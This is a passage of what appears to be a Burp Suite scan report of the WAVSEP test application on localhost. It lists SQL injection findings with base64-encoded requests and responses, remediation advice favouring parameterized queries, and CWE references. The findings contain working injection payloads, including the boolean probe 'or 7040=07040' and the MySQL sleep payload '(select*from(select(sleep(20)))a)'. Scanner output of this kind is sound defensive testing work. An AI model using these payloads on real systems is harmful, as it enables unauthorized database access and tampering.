      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDkwMw0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwODo0NDowOCBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICYjMzk7JiMzOTsmIzM5OyBhdCBsaW5lIDE8L3A+PHA+PGI+RGVzY3JpcHRpb248L2I+IFRoZSBzZXJ2ZXIgZW5jb3VudGVyZWQgYW4gdW5leHBlY3RlZCBjb25kaXRpb24gdGhhdCBwcmV2ZW50ZWQgaXQgZnJvbSBmdWxmaWxsaW5nIHRoZSByZXF1ZXN0LjwvcD48aHIgY2xhc3M9ImxpbmUiIC8+PGgzPkFwYWNoZSBUb21jYXQvOC41Ljg0PC9oMz48L2JvZHk+PC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvQ2FzZTA4LUluamVjdGlvbkluQ2FsYy1OdW1lcmljLUJvb2xlYW5FeHBsb2l0LVdpdGhFcnJvcnMuanNwP21pbkJhbGFuYWNlPTEwMDAwNzU3NzE1ODclMjBvciUyMDcwNDAlM2QwNzA0MCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTUwMEVycm9yL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ1OjI4IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNjMNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgOCAtIEluamVjdGlvbiBpbnRvIG51bWVyaWMgdmFsdWVzIGluIGEgY2FsY3VsYXRpb24gcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKU2V2ZXJhbCBhY2NvdW50cyBtYXRjaCB0aGUgY3JpdGVyaWEuCgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvQ2FzZTA4LUluamVjdGlvbkluQ2FsYy1OdW1lcmljLUJvb2xlYW5FeHBsb2l0LVdpdGhFcnJvcnMuanNwP21pbkJhbGFuYWNlPTEwMDAwNDUyMTExNjMlMjBvciUyMDg1MzUlM2Q4NTM3IEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ1OjI4IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzMzYNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgOCAtIEluamVjdGlvbiBpbnRvIG51bWVyaWMgdmFsdWVzIGluIGEgY2FsY3VsYXRpb24gcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKTm8gTWF0Y2guCgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvQ2FzZTA4LUluamVjdGlvbkluQ2FsYy1OdW1lcmljLUJvb2xlYW5FeHBsb2l0LVdpdGhFcnJvcnMuanNwP21pbkJhbGFuYWNlPShzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKSBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTUwMEVycm9yL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ0OjI4IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNjMNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgOCAtIEluamVjdGlvbiBpbnRvIG51bWVyaWMgdmFsdWVzIGluIGEgY2FsY3VsYXRpb24gcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKU2V2ZXJhbCBhY2NvdW50cyBtYXRjaCB0aGUgY3JpdGVyaWEuCgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>6415362171167037440</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case09-InjectionInUpdate-Numeric-CommandInjection-WithErrors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case09-InjectionInUpdate-Numeric-CommandInjection-WithErrors.jsp [msgid parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msgid</b> parameter appears to be vulnerable to SQL injection attacks. The payload <b>'</b> was submitted in the msgid parameter, and a database error message was returned. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the msgid parameter. The application took <b>20014</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvQ2FzZTA5LUluamVjdGlvbkluVXBkYXRlLU51bWVyaWMtQ29tbWFuZEluamVjdGlvbi1XaXRoRXJyb3JzLmpzcD9tc2dpZD0xJyBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTUwMEVycm9yL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDkwMw0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwODo0NDowOCBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICYjMzk7JiMzOTsmIzM5OyBhdCBsaW5lIDE8L3A+PHA+PGI+RGVzY3JpcHRpb248L2I+IFRoZSBzZXJ2ZXIgZW5jb3VudGVyZWQgYW4gdW5leHBlY3RlZCBjb25kaXRpb24gdGhhdCBwcmV2ZW50ZWQgaXQgZnJvbSBmdWxmaWxsaW5nIHRoZSByZXF1ZXN0LjwvcD48aHIgY2xhc3M9ImxpbmUiIC8+PGgzPkFwYWNoZSBUb21jYXQvOC41Ljg0PC9oMz48L2JvZHk+PC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvQ2FzZTA5LUluamVjdGlvbkluVXBkYXRlLU51bWVyaWMtQ29tbWFuZEluamVjdGlvbi1XaXRoRXJyb3JzLmpzcD9tc2dpZD0oc2VsZWN0KmZyb20oc2VsZWN0KHNsZWVwKDIwKSkpYSkgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC01MDBFcnJvci9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ0OjI4IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzMzcNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgOSAtIEluamVjdGlvbiBpbnRvIG51bWVyaWMgdmFsdWVzIGluIGFuIHVwZGF0ZSBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpRdWVyeSBleGVjdXRlZAoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>5869303898786872320</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case10-InjectionInSearchOrderBy-Numeric-BinaryDeliberateRuntimeError-WithErrors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case10-InjectionInSearchOrderBy-Numeric-BinaryDeliberateRuntimeError-WithErrors.jsp [orderby parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>orderby</b> parameter appears to be vulnerable to SQL injection attacks. The payload <b>'</b> was submitted in the orderby parameter, and a database error message was returned. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the orderby parameter. The application took <b>20008</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
